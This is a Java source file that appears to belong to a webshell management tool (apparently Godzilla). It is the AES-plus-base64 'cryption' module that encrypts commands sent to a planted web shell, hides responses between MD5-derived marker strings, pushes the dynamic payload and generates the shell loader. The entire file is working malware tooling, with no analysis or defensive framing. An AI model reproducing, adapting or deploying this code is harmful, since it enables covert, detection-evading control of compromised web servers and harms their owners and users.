package shells.cryptions.JavaAes;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import java.net.URLEncoder;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import util.Log;
import util.functions;
import util.http.Http;

@CryptionAnnotation(Name = "JAVA_AES_BASE64", payloadName = "JavaDynamicPayload")
public class JavaAesBase64 implements Cryption {
    private Cipher decodeCipher;
    private Cipher encodeCipher;
    private String findStrLeft;
    private String findStrRight;
    private Http http;
    private String key;
    private String pass;
    private byte[] payload;
    private ShellEntity shell;
    private boolean state;

    @Override 
    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX();
        this.pass = this.shell.getPassword();
        String findStrMd5 = functions.md5(this.pass + new String(this.key));
        //初始化md5标识
        this.findStrLeft = findStrMd5.substring(0, 16).toUpperCase();
        this.findStrRight = findStrMd5.substring(16).toUpperCase();
        try {
            this.encodeCipher = Cipher.getInstance("AES");
            this.decodeCipher = Cipher.getInstance("AES");
            this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"));
            this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"));
            this.payload = this.shell.getPayloadModel().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
                return;
            }
            Log.error("payload Is Null");
        } catch (Exception e) {
            Log.error(e);
        }
    }

    @Override 
    public byte[] encode(byte[] data) {
        try {
            return (this.pass + "=" + URLEncoder.encode(functions.base64Encode(this.encodeCipher.doFinal(data)))).getBytes();
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    @Override 
    public byte[] decode(byte[] data) {
        try {
            //这里注意有个findStr
            return this.decodeCipher.doFinal(functions.base64Decode(findStr(data)));
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    public String findStr(byte[] respResult) {
        //从标识里面提出真正的结果
        return functions.subMiddleStr(new String(respResult), this.findStrLeft, this.findStrRight);
    }

    @Override 
    public boolean isSendRLData() {
        return true;
    }

    @Override 
    public boolean check() {
        return this.state;
    }

    @Override 
    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);
    }
}
